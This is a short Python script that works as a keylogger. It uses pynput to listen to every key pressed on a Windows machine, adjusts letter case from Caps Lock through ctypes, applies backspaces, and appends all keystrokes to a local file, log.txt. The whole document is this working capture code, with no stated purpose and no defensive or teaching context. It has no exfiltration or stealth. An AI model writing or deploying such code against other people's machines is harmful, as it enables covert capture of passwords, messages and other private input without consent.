from pynput.keyboard import Key, Listener
import ctypes
import os

# Global variable to track Caps Lock status
caps_lock_enabled = False

def is_caps_lock_on():
    """Checks the current state of Caps Lock."""
    return ctypes.windll.user32.GetKeyState(0x14) & 1  # 0x14 is the virtual key code for Caps Lock

def write_to_file(key):
    global caps_lock_enabled

    # Update Caps Lock status
    caps_lock_enabled = is_caps_lock_on()

    letter = str(key)
    letter = letter.replace("'", "")  # Remove single quotes around the character

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter in ['Key.shift', 'Key.shift_r', 'Key.shift_l', 'Key.caps_lock']:
        return  # Ignore Shift and Caps Lock keys
    elif letter == 'Key.backspace':
        try:
            # Check if the file is empty before attempting to backspace
            if os.path.exists("log.txt") and os.path.getsize("log.txt") > 0:
                with open("log.txt", 'rb+') as f:
                    f.seek(-1, 2)  # Move the pointer to the last character
                    f.truncate()  # Remove the last character
        except Exception:
            pass  # Handle cases where truncation fails for any reason
        return
    elif letter == 'Key.alt':
        letter = '[ALT]'
    elif letter == 'Key.tab':
        letter = '\t'
    elif letter == 'Key.down':
        letter = '[DOWN]'
    elif letter == 'Key.left':
        letter = '[LEFT]'
    elif letter == 'Key.right':
        letter = '[RIGHT]'
    elif len(letter) > 1:  # For special keys like Key.ctrl, Key.esc, etc.
        letter = f'[{letter.upper()}]'

    # Adjust case for regular letters based on Caps Lock
    if len(letter) == 1:  # If it's a single character (not a special key)
        if caps_lock_enabled:
            letter = letter.upper()
        else:
            letter = letter.lower()

    # Write the processed key to the log file
    with open("log.txt", 'a') as f:
        f.write(letter)

# Listener to capture keyboard events
with Listener(on_press=write_to_file) as listener:
    listener.join()
